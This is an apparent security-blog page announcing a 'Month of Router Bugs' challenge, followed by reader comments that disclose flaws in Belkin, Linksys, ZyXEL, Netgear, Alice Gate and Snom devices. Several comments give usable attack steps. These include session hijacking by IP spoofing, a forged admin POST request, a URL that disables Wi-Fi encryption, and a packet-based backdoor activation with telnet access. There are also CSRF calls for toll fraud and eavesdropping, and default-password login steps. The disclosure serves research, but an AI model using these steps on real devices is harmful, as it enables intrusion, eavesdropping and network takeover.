<p>The challenge is supposed to run from 2nd February until 29th February, though it is something that is yet to be clarified because we know that there is a lot to be found.</p>
<p>The reason why we do this is because we want you to help the community to map the current state of embedded devices vulnerabilities. GNUCITIZEN members <a href="/blog/hacking-the-interwebs">have</a> <a href="/blog/call-jacking">been</a> <a href="/blog/bt-home-flub-pwnin-the-bt-home-hub">actively</a> <a href="/blog/security-and-hacking-scene-in-london/">involved</a> with finding vulnerabilities in routers in the past. We believe that embedded devices hacking is a huge topic that is yet to be explored in depth. Your submissions will be included in numerous presentations and research materials and will be credited appropriately.</p>
<blockquote>
<p>The rules are very flexible, every kind of exploit is allowed: from buffer overflows to CSRF issues that plague many routers.</p>

The main idea is to get a good picture of what's going on at the moment when it comes to router hacking. Feel free to advertise it as MoRB :) just to get people to join our friendly challenge although make sure that people should not expect having one vulnerability per day. The more people participate with their router hacks the more vulnerabilities we will be able to outline.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/691de8da509e7f1d427c69339b8facbb?s=256&amp;d=retro" alt="loftgaia"><span class="post-comment-author">loftgaia</span><div class="post-comment-content"><pre><code>Manufacturer:Belkin
Router model:F5D7230-4

I have found a weekness in the way this router maintains access to the control panel.

After a user enters the password sucessfuly in the control center,the router maintains access just by checking the ipaddress. 

Lets suppose i have two computers in my LAN:
PC1-192.168.2.3
PC2-192.168.2.5

I login to the control panel of the router with PC1.
With PC2 i just need to change my IP address:
ifconfig eth0 192.168.2.3

and then i can change any settings in the router with PC2: DNS settings,firewall rules,ip forwarding,etc..

No big deal,but works lol.</pre></code></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">loftgaia, 10x for participating. so basically the router is vulnerable to one of these IP-based session management attacks, Adrian was <a href="http://www.gnucitizen.org/blog/holes-in-embedded-devices-ip-based-session-management" rel="nofollow">talking</a> about.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><a href="http://sla.ckers.org/forum/profile.php?13,1758" rel="nofollow">dzman</a> has submitted the following <a href="http://sla.ckers.org/forum/read.php?13,20128" rel="nofollow">entry</a>:

<pre><code>I've had some fun with my router: LinkSys WRT300N Firmware Version: 2.00.20
Basically it uses XSS, the user does need to be logged into the admin area of the router for this to work.

This will fetch the username/password of my PPPoE login, but with small modifications you can steal/adjust anything you want.

Does not work in IE, probably some small problem but I don't use IE so whatever.
Firefox and Safari are ok.

There are literally MANY issues affecting embedded devices, many of which do *not* require low-level reverse engineering skills to be discovered.

loftgaia, that sounds like a IP-based session management vulnerability. It's really concerning how many devices blindly trust the admin's source IP address after logging in, for authentication state reasons! Corporate networks sharing proxies are definitively at risk on this one.

Also guys, we need to remember that the definition "consumer grade" devices is becoming very blurry these days as these "home" devices are also used by companies in SOHO networks. Exciting topic indeed!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/676b588b1a7a24ddfc6f5b11b90a0513?s=256&amp;d=retro" alt="patrick"><span class="post-comment-author">patrick</span><div class="post-comment-content">@loftgaia: I have the same one and I noticed that the password is not encrypted. If you go to the systems settings and open the source, search for "http_passwd". It's a hidden input field. The password is stored in plaintext and you can easily change it without knowing it. You need to be logged in to view it, but since you can now hijack the session you can easily take control.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/691de8da509e7f1d427c69339b8facbb?s=256&amp;d=retro" alt="loftgaia"><span class="post-comment-author">loftgaia</span><div class="post-comment-content"><pre><code>Sorry for double posting but the situation turned out to be worst than i first thought.

I now have managed to change router configuration options without even logging in. If I try to access the html pages of the router it will ask for a password,but not the script that handles the request itself.So we just need to replay the http packets that actually perform the action.

After sending this the primary DNS server IP-address will get changed to 1.1.1.1 and secondary DNS server to 2.2.2.2 . I have tried changing other options without password and it worked all the time,disable firewall,reset to factory defaults,etc.. The page will still ask for a password...too bad the script didn't.This can obviously be triggered remotely for at least a couple of ways.

<pre><code>There's a VoIP solution called Snom 320 - more info on that beast here: 
[www.snom.com]

It comes with a central phone server which features a web front-end. This 
thing can't be password protected - I don't know why but it just is that way.

there's an input field labeled "Call a number" - and this is done via regular 
POST - no JS, no token - nothing. So - if you manage to get someone with this 
thing in his intranet to visit a prepared site of yours you can make his phone 
do loads of calls to everywhere in the world.

[update]
If you let the victim call yourself and you answer the phone you can hear the 
victim talk without knowing that you are listening. Well done, Snom :)
[/update]

But - you might say - the victim will notice when watching his logs! Nope - he 
won't. The logging application a a Flash file called snomControl.swf. If you 
call let's say 100 numbers in a place really far away you just have to make 
sure the last number you call is - tada:

<strong>"');</strong>


After that all other numbers that have ever been called aren't visible in the 
log anymore since the Flash app kind of crashes internally and only shows the 
calls made after the above mentioned one. I was too lazy to decompile it - 
maybe later.

So - CSRF all over the place but isn't it boring to just get the user to make 
calls when he visits your prepared site? Yes - it is! You can CSRF a nice 
persistent XSS into the address book. So anytime the user visits it you can 
execute your script and do other stuff - like data mining, more calls, even 
some more calls and so on.

There is XSS which also enables you to XHR yourself through the whole front-end 
and change arbitrary settings, like display names on the phone display, read 
out settings and anything else you want. Might be bad if you call your boss 
and some f-words appear on his display...

Well, that's it for now - as said I dunno if this really counts but I consider 
it a funny find anyway ;)</code></pre></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/77c47d54a2c5ee8d235547949f931193?s=256&amp;d=retro" alt=".mario"><span class="post-comment-author">.mario</span><div class="post-comment-content">I wonder if the XSS will appear on our next phone bill ;)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">I am not sure about this one but here is an idea: what if you fill it with space for padding and write your own phone bill :) I am not sure what you are going to use it for but still...</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/80d7b8935b953dabd63268177b7981f6?s=256&amp;d=retro" alt="Ronald"><span class="post-comment-author">Ronald</span><div class="post-comment-content">Nice .mario!

The vulnerabilties you can find are amazing. Many of these issues wouldn't be foudn on regular web apps these days. However, because embedded devices are very primitive in regards to limited hardware, security is very often sacrificed.

Changing DNS server settings without password! WOW! Through away your Belkin F5D7230-4 ASAP!

I bet you can find many more issues, although at this point you owned your router completely since you proved any webpage can make any changes to it!!! :-)

HTTP and related protocols such as UPnP really are the how hanging fruit of embedded devices security.

VulnType: Authentication bypass

There's not a lot of options to configure in this antenna but actually it's possible to "scrap" the antenna by 
sending a corrupted firmware or you could simply bind it to another WiMax base station.

How to exploit it ? 
Pretty simple, once you successfully log into the administration panel, it popups a webpage with all settings 
and a POST forms. Each settings is then accessed by sending a POST request to /process_adv/.

The problem is that /process_adv/* is not validating if an user is authenticated.. so an attacker can access
any options by forging a POST request.

I've used BurpProxy to find out this one, kinda easy.. Setup your IE proxy to localhost:8080 and run BurpProxy,
make any type of http request to your antenna and change the request :

POST /process_adv/ HTTP/1.1
Host: 10.0.0.1
Keep-Alive: 300
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

DialogText=&amp;Advanced=1


I'm currently debugging the firmware to find out if password is stocked in cleartext in the EEPROM. and 
maybe.. there's a backdoor in it ? :-) Port 23 is open and it runs VxWorks.</code></pre></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/37b0f7cf8ccf81abfff68beb1ea54c3e?s=256&amp;d=retro" alt="Kender"><span class="post-comment-author">Kender</span><div class="post-comment-content">Yeah, they almost all run ZyNOS.

One more thing I have found out is that port 21 is open and whether you change the router password or not, the ftp password is always the same: admin and no login. There are some files like nvram.cfg that has the router settings (no passwords), one file with the list of all html pages, one ELF executable which I failed to disassemble - IDA crashes with the following error: "the processor module is prohibited by the key", and few other files.

Here is the summary of the ZyXEL Prestige routers hacking paper:

- persistent JS/HTML injection via SNMP (we thought this is quite cool and potentially a new attack)

- read and write SNMP access enabled by default. btw, there are many ISPs other there that ship Prestige routers with SNMP enabled on WAN (internet visible)!

- privilege escalation from 'user' to 'admin' is possible

- it's possible to extract sensitive information via SNMP read access such as the username and password for the Dynamic DNS service (if such service is enabled of course)

- admin password is MD5-hashed, however no challenge reponse. Therefore, authentication is vulnerable to replay attacks and password cracking (no SSL/TLS is supported by Prestige routers)

- admin sessions can be hijacked, since the user's source IP address is used for authentication which can be trivially spoofed in LAN environments (i.e.: via shared proxy or changing static IP address)

- sensitive data such as passwords, SNMP community strings and WEP keys travels in the clear

We also show how some wireless ZyXEL Prestige gateways can be used as a wardriving tool by using the built-in "wlan scan" command!

Finally, we discuss how attackers can use the owned gateway as a bouncing point to attack machines connected in the internal (LAN) network

HomePage: http://vx.netlux.org/wargamevx
mail addr: wargame89@yahoo.it
Vulnerable device: Alice gate 2 plus wifi
Vendor's page: http://aiuto.alice.it/informazioni/modemadsl/alice_gate2adv.html

It seems to be possible to disable the wifi encryption using the following url:
http://192.168.1.1/cp06_wifi_m_nocifr.cgi?wlChannel=Auto&amp;wlRadioEnable=on 

This can be done because there is no authentication scheme to access the admin panel of the modem,
everyone can access it.

Common scenario:
The attacker sends to the victim (using emails, IM or IRC) the malicious link and with some social techs
makes the victim click on it.
After this, the attacker can access the victim's wlan that is now open to everybody.
Other devices of the same family could be vulnerable too but I did not test it.

Netgear has an internal program for developers that has been leaked to the public to allow a "Telnet Console" for developers.  This opens up the router for someone to telnet into the router with a default username and password.  What is scary is that it allows admin privileges to the router and the ability to view the username and password of the web interface in plain text.  I have found that the "Telnet Console" is disabled every time a new change is made via the web interface or a router reboot. I have personally done this on my own Netgear router.

exploiting buffer overflows for these devices is as trivial as it can get but the only thing that is a problem is to either login into the device and observe any strange messages appearing in the log files which could indicate what the problem is, or attach yourself directly to the device motherboard via JTAG. the second is a bit more complicated. Once we have this information we can verify the exploitability of the problem by mangling with the address space and if passes all test we can sit down and spend time writing payload/shellcode for the affected architecture if there isn't one yet.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/0808e465afcddf24dcea0b5b127fee05?s=256&amp;d=retro" alt="klo"><span class="post-comment-author">klo</span><div class="post-comment-content">"...it is not very clear from your post but are you saying that the payload has to be 298+ characters long?"

Yeah, for example, a 299 characters long username, or 149 char. long username with 150 char. password.  All characters were in the ASCII range.

I basically came across this "http://secunia.com/advisories/29366/" and wanted to see if the DI-624 is also affected.

I forgot to mention the hardware revision is C3.

Your homepage is very nice! I have an MSI RG60SE wireless router.

Have anybody hacked MSI router? If i would get a document file like http://kinqpinz.info/lib/wrt54g/own.txt , it would be great! Maybe there isn't exist info file like this for the MSI's stuff?

===============
1) Introduction
===============

Telecom Italia is the most important Italian ISP offering an ADSL service named "Alice".
Telecom Italia rent out with "Alice Adsl" service, different CPE Modem/Router among which 
the affected ones.
The interface to configure these modems are made extremily poor by the provider to ensure
more control.
There's no way to enable telnet, ftp, tftp or more advanced web pages from the web interface.

http://www.telecomitalia.com/
http://adsl.alice.it/

#############################################################################################

================
2) Vulnerability
================

An attacker can activate and get unauthorized access to the routers administration
interface and telnet/ftp/tftp services from internal network.

Every user in the LAN (or Wireless LAN) can nevertheless have access to the routers
administration interface and telnet/ftp/tftp!

If an attacker can get access to the administrator interface and login, he has full control
over the routers configuration.

#############################################################################################


==============
3) The Exploit
==============

To enable telnet/ftp/tftp and web-admin interface it is necessary send a special
IP packet to router specific ip 192.168.1.1.
This works only from internal LAN where an attacker have and ip like 192.168.1.XX.
The ip packet send to router must have the following feature:

1)IP-protocol-number 255 (there's a RAW SOCKET listening on the router)
2)Payload size 8 byte
3)The payload are the first 8 byte of a salted md5 of the mac address of device br0
4)br0 in these modems has the same mac of eth0

When the modem receives the packet all services will be enabled.


Example:


From a GNU/LINUX distrib:

1)Retrieve br0 maccaddress:

arping -I eth0 -c 2 192.168.1.1

ARPING 192.168.1.1 from 192.168.1.2 eth0
Unicast reply from 192.168.1.1 [00:01:02:03:04:05]  8.419ms
Unicast reply from 192.168.1.1 [00:01:02:03:04:05]  2.095ms
Sent 2 probes (1 broadcast(s))
Received 2 response(s)


2)Calculate special md5 hash from br0 macaddress: create an hex 6 byte long file with the mac address.
	run the application below and copy the output hash.
	http://rapidshare.com/files/153439269/AliceBDhashCreator.zip.html

3)Send ip packet to router ip 192.168.1.1 with 8 byte paylod file (with the tool you like)

	i.e.: nemesis ip -D 192.168.1.1 -p 255 -P hash.hex


4)Telnet to router :

	telnet 192.168.1.1

	BCM96348 ADSL Router
	Login: admin
	Password:

4) The Code
===========

/* Alice Backdoor Pwd creator by saxdax */
/* this code generates an 8 byte hash to use as the paylod of the ip packet   */
/* the mac must be in an hex file and has to be passed as argument to the program */

In VB.Net. If you send the "Authentication BASIC" headers with a random username and password hash through a web browser object with script errors suppressed, it doesnt work the first time, but the second time around it just lets you in regardless with full control of that navigated area. :S I think its a bug in the web server on the router.

firmware:v8.00.2

First off, I would like to confirm on the router using an IP for further authentication, after it has already been logged into using the correct user/pass. I would also like to state that this same issue is present even in remote management of the router using either http or https. You would need the correct management port but that would be quite easy with a default of 80 or 8080 or even a simple port scan could tell you which port it is using for remote management.  

And now to the (if you can call it that) exploit that I found with this router.  It seems (at least for me) that with enough random*see note* access attempts to the router remotely will cause it to not respond for quite sometime, (this feat can also be obtained from behind the router) sometimes even rendering it useless until a reset. Sometimes it will release the dhcp from the modem, some times it will cause just a short nonresponsive state (1-15mins) where nothing from the outside can get a response and when the dhcp releases it causes clients connected to the router to not be able to access the internet. Although a simple reset will fix the issue most times, other times you need to fully reset the modem and the router and allow them to re-sync with each other. 

Not as useful as the other exploits on the wrt54g stated earlier, but it could possibly be used for a DoS I suppose. On that note, the earlier stated exploits using curl to modify config files doesn't seem to work on my router. I think linksys may have fixed those issues with a new firmware as my firmware is a lot newer than  the one stated above.

**NOTE**
By 'random', I mean multiple access attempts that fail. I happened to notice this when attempting some pen-testing of my own on my home network. After some random connection attempts ex:ftp, remote management of the router with wrong user/pass, ssh, telnet, rdesktop, etc. You need to just give the router a bunch of useless information that it cannot seem to process or is attempting to block and eventually it will just freak out and do all sorts of odd things. Especially when attempting connections to services that do exist and are forwarded properly but with the wrong ports specified.

Well I guess that's all for now. I will be sure to post anything more that I find.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/92f6cc20184a3495fd899e3182d0f67d?s=256&amp;d=retro" alt="Rohit"><span class="post-comment-author">Rohit</span><div class="post-comment-content">hey guys , im a total noob in this feild and i really cant understand what u guys are talkin .. but yea what  i know is i have a zyxel p-600 series modem and i really wanna tweak the speed an get some real time amazing download speed, if it is possible please please please be kind enuff to help me out on thiss.. i will really appreciate it..cheers n peace.. im from INDIA...</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/6fd6d48a9c7d3b602ed0c1cca57d1184?s=256&amp;d=retro" alt="ysuf"><span class="post-comment-author">ysuf</span><div class="post-comment-content">Hey i'm ysuf from indonesia.

EDUCATIONAL ONLY

1) Cmd(Command Prompt)
2) Ipconfig 
3) Find default gateway ip (REMEMBER IP)
4) verify with tracert (insert IP here)
5) Type in IP into web browser (this will usually give you the router type if you don't know it already)
6) Find default router passwords by searching for default router passwords on Google (The 1st or second site is the one you will need)
7) Select Router type and then click find and it will give you a list
8) Once you find the default pass go back to the IP login screen and try them 
9) You Should Be In!
10) Have fun, this is for educational purposes only DO NOT TRY IT ON A NEIGHBOR'S ROUTER!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5f2003fdaed6012162d2645206a4e606?s=256&amp;d=retro" alt="Ethical Hacking Forum"><span class="post-comment-author">Ethical Hacking Forum</span><div class="post-comment-content">Computer hacking is most common among teenagers and young adults, although there are many older hackers as well.

well av read all your comments, and av learned many cool stuff here :)  so i should share my knowledge with my friends... to hack the pppoe of you router, 

&gt; you should login, 
&gt; after that just began a new configuration for the router (as you have done the first time you have buy it)
&gt; then follow all the steps without changing any thing (because the router is already configured) and when you reach the page where you enter the USER NAME and the password provided by your ISP, you will see your USER name as characters (some thing like your first-name) but your pass will be encrypted, 
&gt; copy your user name we will need it later.
&gt; get the source page from Mozilla firefox by pressing CTRL+U and then press CTRL+F and past you user name in the search field, press next and you will find your user name somewhere in the page (PPPusername:value:xxxx), just follow the line and you will find some thing like (PPPpassword:value:xxxxx) well done, you get it :D

having a problem with some idiot in my LAN who insert the LAN cable into his router's LAN port instead of WAN. this router generates its own ips from 192.168.1.xx and we cant access internet. all the other users suffer because of this stupid fellow. my network has acl bindings so it is not effecting the main provider and so they can't catch the culprit, infact it is difficult for them to catch 1 person among 2500 users. i can access to admin's page it asks for username/password. its a tplink router. is there a way to get into this router and disable dhcp services remotely ?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/289f3ea2caf965ec79a362e98e2e7434?s=256&amp;d=retro" alt="zwitter"><span class="post-comment-author">zwitter</span><div class="post-comment-content">Alright im inside the router, what more can i do now?
